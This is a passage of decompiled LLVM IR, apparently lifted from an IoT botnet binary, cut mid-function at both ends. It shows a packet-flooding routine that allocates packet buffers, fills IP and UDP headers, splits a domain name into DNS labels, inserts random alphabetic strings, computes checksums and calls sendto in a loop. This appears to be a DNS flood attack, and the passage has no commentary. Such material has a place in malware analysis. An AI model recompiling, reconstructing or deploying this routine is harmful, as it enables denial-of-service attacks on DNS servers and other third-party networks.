  %v3_bbc4 = urem i32 %v6_b9d0, 65536
  store i32 %v3_bbc4, i32* %r2.global-to-local, align 4
  %v2_bbc8 = icmp eq i32 %arg2, 0
  store i1 %v2_bbc8, i1* %cpsr_z.global-to-local, align 1
  %v1_bbcc = urem i32 %v6_b9e8, 256
  store i32 %v1_bbcc, i32* @sl, align 4
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_bbc8, label %dec_label_pc_bf2c.critedge, label %dec_label_pc_bbe8

dec_label_pc_bbe8:                                ; preds = %dec_label_pc_bb8c
  %v3_bb9c = mul i32 %v6_b9d0, 65536
  %v2_bbf4 = add i32 %v2_bb40, %v1_bbcc
  %v3_bbf8 = mul i32 %v2_bbf4, 65536
  %v1_bc04 = add i32 %v3_bbf8, 1769472
  %tmp114 = mul nuw nsw i32 %v3_bbc0, 256
  %v3_bc08 = and i32 %tmp114, 65280
  %v1_bc0c = add i32 %v3_bbf8, 3080192
  %tmp115 = udiv i32 %v6_b9b4, 256
  %v4_bc1c = urem i32 %tmp115, 256
  %v5_bc1c = or i32 %v3_bc08, %v4_bc1c
  store i32 %v5_bc1c, i32* @sb, align 4
  store i32 %v3_bb9c, i32* %ip.global-to-local, align 4
  %tmp116 = udiv i32 %v1_bc04, 256
  %v3_bc24 = and i32 %tmp116, 65280
  %tmp117 = udiv i32 %v1_bc0c, 256
  %v3_bc28 = and i32 %tmp117, 65280
  store i32 %v3_bc28, i32* %r2.global-to-local, align 4
  %tmp118 = mul i32 %v6_b9d0, 256
  %v3_bc2c = and i32 %tmp118, 65280
  %v4_bc30 = udiv i32 %v1_bc04, 16777216
  %v5_bc30 = or i32 %v3_bc24, %v4_bc30
  store i32 %v5_bc30, i32* @fp, align 4
  %tmp119 = mul i32 %v7_b940, 256
  %v3_bc38 = and i32 %tmp119, 65280
  store i32 %v3_bc38, i32* %r1.global-to-local, align 4
  %v4_bc3c = udiv i32 %v1_bc0c, 16777216
  %v5_bc3c = or i32 %v3_bc28, %v4_bc3c
  store i32 %v5_bc3c, i32* %r3.global-to-local, align 4
  %tmp120 = udiv i32 %v6_b9d0, 256
  %v4_bc40 = urem i32 %tmp120, 256
  %v5_bc40 = or i32 %v4_bc40, %v3_bc2c
  store i32 %v5_bc40, i32* @r4, align 4
  store i32 %v2_bb40, i32* @lr, align 4
  %tmp121 = udiv i32 %v7_b940, 256
  %v4_bc48 = urem i32 %tmp121, 256
  %v5_bc48 = or i32 %v4_bc48, %v3_bc38
  %tmp122 = mul i32 %v6_b99c, 256
  %v3_bc4c = and i32 %tmp122, 65280
  store i32 %v3_bc4c, i32* %r0.global-to-local, align 4
  %tmp123 = udiv i32 %v6_b99c, 256
  %v4_bc5c = urem i32 %tmp123, 256
  %v5_bc5c = or i32 %v4_bc5c, %v3_bc4c
  store i32 %v5_bc5c, i32* @r8, align 4
  store i32 0, i32* @r5, align 4
  %v1_bc64 = add i32 %v2_bb40, 1
  store i32 %v1_bc64, i32* @r6, align 4
  %v1_bcac = trunc i32 %v6_b91c to i8
  %sext = mul nuw i32 %v5_bc3c, 65536
  %v4_bcb8 = sdiv i32 %sext, 65536
  %sext6 = mul nuw i32 %v5_bc48, 65536
  %v4_bcbc = sdiv i32 %sext6, 65536
  %sext7 = mul nuw i32 %v5_bc40, 65536
  %v4_bd18 = sdiv i32 %sext7, 65536
  %v2_bd3c = icmp eq i32 %v2_bb40, 0
  %tmp124 = icmp slt i32 %v2_bb40, 1
  %v1_bcc4 = trunc i32 %v5_b978 to i8
  br label %dec_label_pc_bc68

dec_label_pc_bc68:                                ; preds = %dec_label_pc_bd88, %dec_label_pc_bbe8
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 600, i32* %r0.global-to-local, align 4
  %v2_bc70 = call i32 @calloc(i32 600, i32 1)
  store i32 %v2_bc70, i32* %r0.global-to-local, align 4
  store i32 %v2_b904, i32* %r1.global-to-local, align 4
  %v3_bc78 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_bc78, i32* %r3.global-to-local, align 4
  %v2_bc7c = load i32, i32* @r5, align 4
  %v5_bc7c = mul i32 %v2_bc7c, 4
  %v6_bc7c = add i32 %v5_bc7c, %v2_b904
  %v7_bc7c = inttoptr i32 %v6_bc7c to i32*
  store i32 %v2_bc70, i32* %v7_bc7c, align 4
  %v0_bc80 = load i32, i32* %r1.global-to-local, align 4
  %v1_bc80 = load i32, i32* %r3.global-to-local, align 4
  %v4_bc80 = mul i32 %v1_bc80, 4
  %v5_bc80 = add i32 %v4_bc80, %v0_bc80
  %v6_bc80 = inttoptr i32 %v5_bc80 to i32*
  %v7_bc80 = load i32, i32* %v6_bc80, align 4
  store i32 %v7_bc80, i32* %r1.global-to-local, align 4
  %v1_bc84 = inttoptr i32 %v7_bc80 to i8*
  %v2_bc84 = load i8, i8* %v1_bc84, align 1
  %tmp = urem i8 %v2_bc84, 16
  %v1_bc88 = zext i8 %tmp to i32
  %v1_bc8c = or i32 %v1_bc88, 64
  store i32 %v1_bc8c, i32* %r2.global-to-local, align 4
  %v1_bc90 = trunc i32 %v1_bc8c to i8
  store i8 %v1_bc90, i8* %v1_bc84, align 1
  %v0_bc94 = load i32, i32* %r1.global-to-local, align 4
  %v1_bc94 = inttoptr i32 %v0_bc94 to i8*
  %v2_bc94 = load i8, i8* %v1_bc94, align 1
  %v1_bc98 = and i8 %v2_bc94, -16
  %v1_bc9c = or i8 %v1_bc98, 5
  store i32 %v1_b984, i32* %ip.global-to-local, align 4
  store i8 %v1_bc9c, i8* %v1_bc94, align 1
  store i32 %v1_b928, i32* %lr.global-to-local, align 4
  %v2_bcac = load i32, i32* %r1.global-to-local, align 4
  %v3_bcac = add i32 %v2_bcac, 1
  %v4_bcac = inttoptr i32 %v3_bcac to i8*
  store i8 %v1_bcac, i8* %v4_bcac, align 1
  store i32 %v5_b978, i32* %r3.global-to-local, align 4
  %v0_bcb4 = load i32, i32* %ip.global-to-local, align 4
  %v2_bcb4 = icmp eq i32 %v0_bcb4, 0
  store i1 %v2_bcb4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v4_bcb8, i32* %r0.global-to-local, align 4
  store i32 %v4_bcbc, i32* %r2.global-to-local, align 4
  br i1 %v2_bcb4, label %bb126, label %bb125

bb125:                                            ; preds = %dec_label_pc_bc68
  store i32 64, i32* %lr.global-to-local, align 4
  br label %bb126

bb126:                                            ; preds = %dec_label_pc_bc68, %bb125
  %v2_bcc4 = load i32, i32* %r1.global-to-local, align 4
  %v3_bcc4 = add i32 %v2_bcc4, 8
  %v4_bcc4 = inttoptr i32 %v3_bcc4 to i8*
  store i8 %v1_bcc4, i8* %v4_bcc4, align 1
  store i32 17, i32* %r3.global-to-local, align 4
  %v2_bccc = load i32, i32* %r1.global-to-local, align 4
  %v3_bccc = add i32 %v2_bccc, 9
  %v4_bccc = inttoptr i32 %v3_bccc to i8*
  store i8 17, i8* %v4_bccc, align 1
  %v0_bcd0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_bcd0, label %bb128, label %bb127

bb127:                                            ; preds = %bb126
  %v1_bcd0 = load i32, i32* %lr.global-to-local, align 4
  %v2_bcd0 = trunc i32 %v1_bcd0 to i16
  %v3_bcd0 = load i32, i32* %r1.global-to-local, align 4
  %v4_bcd0 = add i32 %v3_bcd0, 6
  %v5_bcd0 = inttoptr i32 %v4_bcd0 to i16*
  store i16 %v2_bcd0, i16* %v5_bcd0, align 2
  br label %bb128

bb128:                                            ; preds = %bb126, %bb127
  store i32 ptrtoint (i32* @global_var_23a2c.55 to i32), i32* @lr, align 4
  %v0_bcd8 = load i32, i32* %r0.global-to-local, align 4
  %v1_bcd8 = trunc i32 %v0_bcd8 to i16
  %v2_bcd8 = load i32, i32* %r1.global-to-local, align 4
  %v3_bcd8 = add i32 %v2_bcd8, 2
  %v4_bcd8 = inttoptr i32 %v3_bcd8 to i16*
  store i16 %v1_bcd8, i16* %v4_bcd8, align 2
  %v0_bcdc = load i32, i32* %r2.global-to-local, align 4
  %v1_bcdc = trunc i32 %v0_bcdc to i16
  %v2_bcdc = load i32, i32* %r1.global-to-local, align 4
  %v3_bcdc = add i32 %v2_bcdc, 4
  %v4_bcdc = inttoptr i32 %v3_bcdc to i16*
  store i16 %v1_bcdc, i16* %v4_bcdc, align 2
  %v2_bce0 = load i32, i32* @global_var_23a2c.55, align 4
  store i32 %v2_bce0, i32* %r3.global-to-local, align 4
  %v0_bce4 = load i32, i32* %r1.global-to-local, align 4
  %v1_bce4 = add i32 %v0_bce4, 20
  store i32 %v1_bce4, i32* %r0.global-to-local, align 4
  %v1_bce8 = add i32 %v0_bce4, 41
  store i32 %v1_bce8, i32* %r2.global-to-local, align 4
  %v0_bcec = load i32, i32* @fp, align 4
  %v1_bcec = trunc i32 %v0_bcec to i16
  %v3_bcec = add i32 %v0_bce4, 24
  %v4_bcec = inttoptr i32 %v3_bcec to i16*
  store i16 %v1_bcec, i16* %v4_bcec, align 2
  %v0_bcf0 = load i32, i32* @sb, align 4
  %v1_bcf0 = trunc i32 %v0_bcf0 to i16
  %v2_bcf0 = load i32, i32* %r0.global-to-local, align 4
  %v3_bcf0 = add i32 %v2_bcf0, 2
  %v4_bcf0 = inttoptr i32 %v3_bcf0 to i16*
  store i16 %v1_bcf0, i16* %v4_bcf0, align 2
  %v0_bcf4 = load i32, i32* %r1.global-to-local, align 4
  %v1_bcf4 = add i32 %v0_bcf4, 28
  store i32 %v1_bcf4, i32* %ip.global-to-local, align 4
  %v0_bcf8 = load i32, i32* %r2.global-to-local, align 4
  %v1_bcf8 = load i32, i32* @sl, align 4
  %v2_bcf8 = add i32 %v1_bcf8, %v0_bcf8
  store i32 %v2_bcf8, i32* @r4, align 4
  store i32 256, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v0_bd04 = load i32, i32* @r8, align 4
  %v1_bd04 = trunc i32 %v0_bd04 to i16
  %v3_bd04 = add i32 %v0_bcf4, 20
  %v4_bd04 = inttoptr i32 %v3_bd04 to i16*
  store i16 %v1_bd04, i16* %v4_bd04, align 2
  %v0_bd08 = load i32, i32* %r3.global-to-local, align 4
  %v1_bd08 = load i32, i32* %r1.global-to-local, align 4
  %v2_bd08 = add i32 %v1_bd08, 12
  %v3_bd08 = inttoptr i32 %v2_bd08 to i32*
  store i32 %v0_bd08, i32* %v3_bd08, align 4
  %v0_bd0c = load i32, i32* %r0.global-to-local, align 4
  %v1_bd0c = trunc i32 %v0_bd0c to i16
  %v2_bd0c = load i32, i32* %ip.global-to-local, align 4
  %v3_bd0c = add i32 %v2_bd0c, 4
  %v4_bd0c = inttoptr i32 %v3_bd0c to i16*
  store i16 %v1_bd0c, i16* %v4_bd0c, align 2
  %v0_bd10 = load i32, i32* %r2.global-to-local, align 4
  %v1_bd10 = trunc i32 %v0_bd10 to i16
  %v2_bd10 = load i32, i32* %ip.global-to-local, align 4
  %v3_bd10 = add i32 %v2_bd10, 2
  %v4_bd10 = inttoptr i32 %v3_bd10 to i16*
  store i16 %v1_bd10, i16* %v4_bd10, align 2
  store i32 %stack_var_-2184.0, i32* %r3.global-to-local, align 4
  store i32 %v4_bd18, i32* %ip.global-to-local, align 4
  %v1_bd1c = load i32, i32* %r1.global-to-local, align 4
  %v2_bd1c = add i32 %v1_bd1c, 16
  %v3_bd1c = inttoptr i32 %v2_bd1c to i32*
  store i32 %stack_var_-2184.0, i32* %v3_bd1c, align 4
  %v0_bd20 = load i32, i32* %ip.global-to-local, align 4
  %v1_bd20 = trunc i32 %v0_bd20 to i16
  %v2_bd20 = load i32, i32* %r1.global-to-local, align 4
  %v3_bd20 = add i32 %v2_bd20, 28
  %v4_bd20 = inttoptr i32 %v3_bd20 to i16*
  store i16 %v1_bd20, i16* %v4_bd20, align 2
  %v0_bd24 = load i32, i32* @sl, align 4
  %v1_bd24 = trunc i32 %v0_bd24 to i8
  %v2_bd24 = load i32, i32* %r1.global-to-local, align 4
  %v3_bd24 = add i32 %v2_bd24, 40
  %v4_bd24 = inttoptr i32 %v3_bd24 to i8*
  store i8 %v1_bd24, i8* %v4_bd24, align 1
  %v0_bd28 = load i32, i32* @r4, align 4
  %v1_bd28 = add i32 %v0_bd28, 1
  store i32 %v1_bd28, i32* %r0.global-to-local, align 4
  %v0_bd2c = load i32, i32* @r7, align 4
  store i32 %v0_bd2c, i32* %r1.global-to-local, align 4
  %v0_bd30 = load i32, i32* @r6, align 4
  store i32 %v0_bd30, i32* %r2.global-to-local, align 4
  %v3_bd34 = call i32 @util_memcpy(i32 %v1_bd28, i32 %v0_bd2c, i32 %v0_bd30)
  store i32 %v3_bd34, i32* %r0.global-to-local, align 4
  store i32 %v2_bb40, i32* %lr.global-to-local, align 4
  store i1 %v2_bd3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %tmp124, label %.dec_label_pc_bd88_crit_edge, label %dec_label_pc_bd4c

.dec_label_pc_bd88_crit_edge:                     ; preds = %bb128
  %v5_bd40 = load i32, i32* @r4, align 4
  store i32 %v5_bd40, i32* %r0.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_bd88

dec_label_pc_bd4c:                                ; preds = %bb128
  store i32 0, i32* %ip.global-to-local, align 4
  %v0_bd50 = load i32, i32* @r4, align 4
  store i32 %v0_bd50, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_bd58

dec_label_pc_bd58:                                ; preds = %.thread19, %dec_label_pc_bd4c
  %v1_bd60 = phi i32 [ %v1_bd6035, %.thread19 ], [ 0, %dec_label_pc_bd4c ]
  %v0_bd7417 = phi i32 [ %v0_bd80, %.thread19 ], [ 0, %dec_label_pc_bd4c ]
  %v1_bd58 = load i32, i32* @r7, align 4
  %v2_bd58 = add i32 %v1_bd58, %v0_bd7417
  %v3_bd58 = inttoptr i32 %v2_bd58 to i8*
  %v4_bd58 = load i8, i8* %v3_bd58, align 1
  %v6_bd58 = zext i8 %v4_bd58 to i32
  store i32 %v6_bd58, i32* %r3.global-to-local, align 4
  %v7_bd5c = icmp eq i8 %v4_bd58, 46
  store i1 %v7_bd5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_bd5c, label %bb129, label %bb131

bb129:                                            ; preds = %dec_label_pc_bd58
  %v2_bd60 = trunc i32 %v1_bd60 to i8
  %v3_bd60 = load i32, i32* %r0.global-to-local, align 4
  %v4_bd60 = inttoptr i32 %v3_bd60 to i8*
  store i8 %v2_bd60, i8* %v4_bd60, align 1
  %v0_bd68.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_bd64 = load i32, i32* %ip.global-to-local, align 4
  %v1_bd64 = add i32 %v0_bd64, 1
  store i32 %v1_bd64, i32* %r2.global-to-local, align 4
  br i1 %v0_bd68.pr, label %bb132, label %bb130

bb130:                                            ; preds = %bb129
  %v2_bd6815 = urem i32 %v1_bd64, 256
  store i32 %v2_bd6815, i32* %ip.global-to-local, align 4
  store i32 %v2_bb40, i32* %r2.global-to-local, align 4
  %v0_bd74.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_bd74 = add i32 %v0_bd74.pre, 1
  store i32 %v1_bd74, i32* %r1.global-to-local, align 4
  br label %.thread19

bb131:                                            ; preds = %dec_label_pc_bd58
  %v1_bd6411 = add nsw i32 %v1_bd60, 1
  %v2_bd68 = urem i32 %v1_bd6411, 256
  store i32 %v2_bd68, i32* %ip.global-to-local, align 4
  store i32 %v2_bb40, i32* %r2.global-to-local, align 4
  %v1_bd7418 = add i32 %v0_bd7417, 1
  store i32 %v1_bd7418, i32* %r1.global-to-local, align 4
  br label %.thread19

bb132:                                            ; preds = %bb129
  store i32 %v2_bb40, i32* %r2.global-to-local, align 4
  %v1_bd70.pre = load i32, i32* %r1.global-to-local, align 4
  %v2_bd70 = load i32, i32* @r4, align 4
  %v3_bd70 = add i32 %v2_bd70, %v1_bd70.pre
  store i32 %v3_bd70, i32* %r3.global-to-local, align 4
  %v1_bd7465 = add i32 %v1_bd70.pre, 1
  store i32 %v1_bd7465, i32* %r1.global-to-local, align 4
  %v2_bd78 = add i32 %v3_bd70, 1
  store i32 %v2_bd78, i32* %r0.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %.thread19

.thread19:                                        ; preds = %bb131, %bb130, %bb132
  %v0_bd80 = phi i32 [ %v1_bd74, %bb130 ], [ %v1_bd7418, %bb131 ], [ %v1_bd7465, %bb132 ]
  %v1_bd6035 = phi i32 [ %v2_bd6815, %bb130 ], [ %v2_bd68, %bb131 ], [ 0, %bb132 ]
  %v9_bd80 = icmp eq i32 %v0_bd80, %v2_bb40
  store i1 %v9_bd80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_bd80, label %dec_label_pc_bd88.loopexit, label %dec_label_pc_bd58

dec_label_pc_bd88.loopexit:                       ; preds = %.thread19
  %v2_bd88.pre = load i32, i32* %r0.global-to-local, align 4
  %extract.t71 = trunc i32 %v1_bd6035 to i8
  br label %dec_label_pc_bd88

dec_label_pc_bd88:                                ; preds = %.dec_label_pc_bd88_crit_edge, %dec_label_pc_bd88.loopexit
  %v0_bd88.pre.sink.off0 = phi i8 [ 0, %.dec_label_pc_bd88_crit_edge ], [ %extract.t71, %dec_label_pc_bd88.loopexit ]
  %v2_bd88 = phi i32 [ %v5_bd40, %.dec_label_pc_bd88_crit_edge ], [ %v2_bd88.pre, %dec_label_pc_bd88.loopexit ]
  %v3_bd88 = inttoptr i32 %v2_bd88 to i8*
  store i8 %v0_bd88.pre.sink.off0, i8* %v3_bd88, align 1
  %v3_bd8c = load i32, i32* %stack_var_-44, align 4
  store i32 %arg2, i32* %ip.global-to-local, align 4
  %v1_bd94 = add i32 %v3_bd8c, 1
  store i32 %v1_bd94, i32* @r5, align 4
  store i32 %v2_bb40, i32* %r3.global-to-local, align 4
  store i32 256, i32* @lr, align 4
  %v0_bda0 = load i32, i32* @r4, align 4
  %v2_bda0 = add i32 %v0_bda0, %v2_bb40
  store i32 %v2_bda0, i32* %r2.global-to-local, align 4
  %v9_bda4 = icmp eq i32 %v1_bd94, %arg2
  store i1 %v9_bda4, i1* %cpsr_z.global-to-local, align 1
  %v3_bda8 = add i32 %v2_bda0, 4
  %v4_bda8 = inttoptr i32 %v3_bda8 to i16*
  store i16 256, i16* %v4_bda8, align 2
  %v0_bdac = load i32, i32* @lr, align 4
  %v1_bdac = trunc i32 %v0_bdac to i16
  %v2_bdac = load i32, i32* %r2.global-to-local, align 4
  %v3_bdac = add i32 %v2_bdac, 2
  %v4_bdac = inttoptr i32 %v3_bdac to i16*
  store i16 %v1_bdac, i16* %v4_bdac, align 2
  %v0_bdb0 = load i32, i32* @r5, align 4
  store i32 %v0_bdb0, i32* %stack_var_-44, align 4
  %v8_bdb4 = icmp slt i32 %v1_bd94, %arg2
  br i1 %v8_bdb4, label %dec_label_pc_bc68, label %dec_label_pc_bdb8

dec_label_pc_bdb8:                                ; preds = %dec_label_pc_bd88, %dec_label_pc_bf2c
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i1 %v2_bbc8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_bbc8, label %dec_label_pc_bf2c, label %dec_label_pc_bdcc

dec_label_pc_bdcc:                                ; preds = %dec_label_pc_bdb8
  store i32 %v2_bb40, i32* %r1.global-to-local, align 4
  %v1_bdd0 = load i32, i32* @sl, align 4
  %v2_bdd0 = add i32 %v1_bdd0, %v2_bb40
  store i32 %v2_bdd0, i32* %r3.global-to-local, align 4
  %v1_bdd4 = add i32 %v2_bdd0, 47
  store i32 %v1_bdd4, i32* @fp, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_bddc = add i32 %v2_bdd0, 27
  store i32 %v1_bddc, i32* @sb, align 4
  %v3_beb8 = icmp eq i32 %v3_bbb8, 65535
  %v3_bde8 = icmp eq i32 %v3_bbbc, 65535
  br label %dec_label_pc_bea4

dec_label_pc_bde4:                                ; preds = %dec_label_pc_bea4
  store i32 %v3_bbbc, i32* %ip.global-to-local, align 4
  store i1 %v3_bde8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_bde8, label %dec_label_pc_bee0, label %dec_label_pc_bdf0

dec_label_pc_bdf0:                                ; preds = %dec_label_pc_becc.dec_label_pc_bdf0_crit_edge, %dec_label_pc_bde4
  %v1_bdf4 = phi i32 [ %v1_bdf4.pre, %dec_label_pc_becc.dec_label_pc_bdf0_crit_edge ], [ 65535, %dec_label_pc_bde4 ]
  store i32 %v3_bbc0, i32* @lr, align 4
  %v9_bdf4 = icmp eq i32 %v3_bbc0, %v1_bdf4
  store i1 %v9_bdf4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_bdf4, label %dec_label_pc_bef4, label %dec_label_pc_bdfc

dec_label_pc_bdfc:                                ; preds = %dec_label_pc_bee0.dec_label_pc_bdfc_crit_edge, %dec_label_pc_bdf0
  %v1_be00 = phi i32 [ %v1_be00.pre, %dec_label_pc_bee0.dec_label_pc_bdfc_crit_edge ], [ %v1_bdf4, %dec_label_pc_bdf0 ]
  store i32 %v3_bbc4, i32* %r0.global-to-local, align 4
  %v9_be00 = icmp eq i32 %v3_bbc4, %v1_be00
  store i1 %v9_be00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_be00, label %dec_label_pc_bf08, label %dec_label_pc_be08

dec_label_pc_be08:                                ; preds = %dec_label_pc_bef4, %dec_label_pc_bdfc, %dec_label_pc_bf08
  %v0_be08 = load i32, i32* @r7, align 4
  store i32 %v0_be08, i32* %r0.global-to-local, align 4
  %v0_be0c = load i32, i32* @sl, align 4
  store i32 %v0_be0c, i32* %r1.global-to-local, align 4
  %v2_be10 = call i32 @rand_alphastr(i32 %v0_be08, i32 %v0_be0c)
  %v0_be14 = load i32, i32* @r8, align 4
  %v1_be14 = trunc i32 %v0_be14 to i8
  %v2_be14 = load i32, i32* @r7, align 4
  %v3_be14 = load i32, i32* @sl, align 4
  %v4_be14 = add i32 %v3_be14, %v2_be14
  %v5_be14 = inttoptr i32 %v4_be14 to i8*
  store i8 %v1_be14, i8* %v5_be14, align 1
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_be1c = load i32, i32* @r8, align 4
  %v1_be1c = trunc i32 %v0_be1c to i16
  %v2_be1c = load i32, i32* @r4, align 4
  %v3_be1c = add i32 %v2_be1c, 10
  %v4_be1c = inttoptr i32 %v3_be1c to i16*
  store i16 %v1_be1c, i16* %v4_be1c, align 2
  %v0_be20 = load i32, i32* @r4, align 4
  store i32 %v0_be20, i32* @r0, align 4
  %v2_be24 = call i32 @checksum_generic(i32 %v0_be20, i32 20)
  %v3_be24 = trunc i32 %v2_be24 to i16
  store i32 %v2_be24, i32* %r0.global-to-local, align 4
  %v3_be28 = load i32, i32* @r4, align 4
  %v4_be28 = add i32 %v3_be28, 10
  %v5_be28 = inttoptr i32 %v4_be28 to i16*
  store i16 %v3_be24, i16* %v5_be28, align 2
  %v0_be2c = load i32, i32* @r6, align 4
  store i32 %v0_be2c, i32* @r1, align 4
  %v1_be30 = add i32 %v0_be2c, 4
  %v2_be30 = inttoptr i32 %v1_be30 to i16*
  %v3_be30 = load i16, i16* %v2_be30, align 2
  %v4_be30 = zext i16 %v3_be30 to i32
  store i32 %v4_be30, i32* %r2.global-to-local, align 4
  %v0_be34 = load i32, i32* @r8, align 4
  %v1_be34 = trunc i32 %v0_be34 to i16
  %v3_be34 = add i32 %v0_be2c, 6
  %v4_be34 = inttoptr i32 %v3_be34 to i16*
  store i16 %v1_be34, i16* %v4_be34, align 2
  %v0_be38 = load i32, i32* @sb, align 4
  store i32 %v0_be38, i32* %r3.global-to-local, align 4
  %v0_be3c = load i32, i32* @r4, align 4
  store i32 %v0_be3c, i32* %r0.global-to-local, align 4
  %v4_be40 = call i32 @checksum_tcpudp(i32 %v0_be3c, i32 %v0_be2c, i32 %v4_be30, i32 %v0_be38)
  %v5_be40 = trunc i32 %v4_be40 to i16
  store i32 %v4_be40, i32* %r0.global-to-local, align 4
  %v3_be44 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_be44, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r1.global-to-local, align 4
  %v3_be4c = mul i32 %v3_be44, 32
  store i32 %v3_be4c, i32* %ip.global-to-local, align 4
  %v3_be50 = load i32, i32* @r6, align 4
  %v4_be50 = add i32 %v3_be50, 6
  %v5_be50 = inttoptr i32 %v4_be50 to i16*
  store i16 %v5_be40, i16* %v5_be50, align 2
  store i32 %stack_var_-2184.0, i32* %r2.global-to-local, align 4
  %v0_be58 = load i32, i32* @r6, align 4
  %v1_be58 = add i32 %v0_be58, 2
  %v2_be58 = inttoptr i32 %v1_be58 to i16*
  %v3_be58 = load i16, i16* %v2_be58, align 2
  %v4_be58 = zext i16 %v3_be58 to i32
  store i32 %v4_be58, i32* @r6, align 4
  %v0_be5c = load i32, i32* %ip.global-to-local, align 4
  %v1_be5c = load i32, i32* %r3.global-to-local, align 4
  %tmp135 = mul i32 %v1_be5c, -8
  %v5_be5c = add i32 %v0_be5c, %tmp135
  %v1_be60 = load i32, i32* %r1.global-to-local, align 4
  %v2_be60 = add i32 %v1_be60, %v5_be5c
  store i32 %v2_be60, i32* %ip.global-to-local, align 4
  %v2_be64 = add i32 %v2_be60, 4
  %v3_be64 = inttoptr i32 %v2_be64 to i32*
  store i32 %stack_var_-2184.0, i32* %v3_be64, align 4
  %v0_be68 = load i32, i32* @r6, align 4
  %v1_be68 = trunc i32 %v0_be68 to i16
  %v2_be68 = load i32, i32* %ip.global-to-local, align 4
  %v3_be68 = add i32 %v2_be68, 2
  %v4_be68 = inttoptr i32 %v3_be68 to i16*
  store i16 %v1_be68, i16* %v4_be68, align 2
  %v0_be6c = load i32, i32* @r4, align 4
  store i32 %v0_be6c, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 %v3_bb54, i32* %r0.global-to-local, align 4
  %v0_be78 = load i32, i32* @fp, align 4
  store i32 %v0_be78, i32* %r2.global-to-local, align 4
  store i32 16, i32* @r4, align 4
  %v0_be80 = load i32, i32* %ip.global-to-local, align 4
  %v6_be88 = call i32 @__libc_sendto(i32 %v3_bb54, i32 %v0_be6c, i32 %v0_be78, i32 16384, i32 %v0_be80, i32 16)
  %v3_be8c = load i32, i32* %stack_var_-44, align 4
  %v1_be90 = add i32 %v3_be8c, 1
  store i32 %v1_be90, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v9_be98 = icmp eq i32 %v1_be90, %arg2
  store i1 %v9_be98, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_be90, i32* %stack_var_-44, align 4
  %v7_bea0 = icmp slt i32 %v1_be90, %arg2
  br i1 %v7_bea0, label %dec_label_pc_bea4, label %dec_label_pc_bf2c

dec_label_pc_bea4:                                ; preds = %dec_label_pc_be08, %dec_label_pc_bdcc
  %v1_beb0 = phi i32 [ %v1_be90, %dec_label_pc_be08 ], [ 0, %dec_label_pc_bdcc ]
  store i32 %v2_b904, i32* %r2.global-to-local, align 4
  store i32 %v3_bbb8, i32* %r3.global-to-local, align 4
  %v4_beb0 = mul i32 %v1_beb0, 4
  %v5_beb0 = add i32 %v4_beb0, %v2_b904
  %v6_beb0 = inttoptr i32 %v5_beb0 to i32*
  %v7_beb0 = load i32, i32* %v6_beb0, align 4
  store i32 %v7_beb0, i32* @r4, align 4
  store i32 65535, i32* @r5, align 4
  store i1 %v3_beb8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* @r8, align 4
  %v1_bec0 = add i32 %v7_beb0, 20
  store i32 %v1_bec0, i32* @r6, align 4
  %v1_bec4 = add i32 %v7_beb0, 41
  store i32 %v1_bec4, i32* @r7, align 4
  br i1 %v3_beb8, label %dec_label_pc_becc, label %dec_label_pc_bde4

dec_label_pc_becc:                                ; preds = %dec_label_pc_bea4
  %v0_becc = call i32 @rand_next()
  %v1_becc = trunc i32 %v0_becc to i16
  store i32 %v0_becc, i32* %r0.global-to-local, align 4
  store i32 %v3_bbbc, i32* %ip.global-to-local, align 4
  %v1_bed4 = load i32, i32* @r5, align 4
  %v9_bed4 = icmp eq i32 %v3_bbbc, %v1_bed4
  store i1 %v9_bed4, i1* %cpsr_z.global-to-local, align 1
  %v3_bed8 = load i32, i32* @r4, align 4
  %v4_bed8 = add i32 %v3_bed8, 4
  %v5_bed8 = inttoptr i32 %v4_bed8 to i16*
  store i16 %v1_becc, i16* %v5_bed8, align 2
  br i1 %v9_bed4, label %dec_label_pc_bee0, label %dec_label_pc_becc.dec_label_pc_bdf0_crit_edge

dec_label_pc_becc.dec_label_pc_bdf0_crit_edge:    ; preds = %dec_label_pc_becc
  %v1_bdf4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_bdf0

dec_label_pc_bee0:                                ; preds = %dec_label_pc_becc, %dec_label_pc_bde4
  %v0_bee0 = call i32 @rand_next()
  %v1_bee0 = trunc i32 %v0_bee0 to i16
  store i32 %v0_bee0, i32* %r0.global-to-local, align 4
  store i32 %v3_bbc0, i32* @lr, align 4
  %v1_bee8 = load i32, i32* @r5, align 4
  %v9_bee8 = icmp eq i32 %v3_bbc0, %v1_bee8
  store i1 %v9_bee8, i1* %cpsr_z.global-to-local, align 1
  %v3_beec = load i32, i32* @r4, align 4
  %v4_beec = add i32 %v3_beec, 20
  %v5_beec = inttoptr i32 %v4_beec to i16*
  store i16 %v1_bee0, i16* %v5_beec, align 2
  br i1 %v9_bee8, label %dec_label_pc_bef4, label %dec_label_pc_bee0.dec_label_pc_bdfc_crit_edge

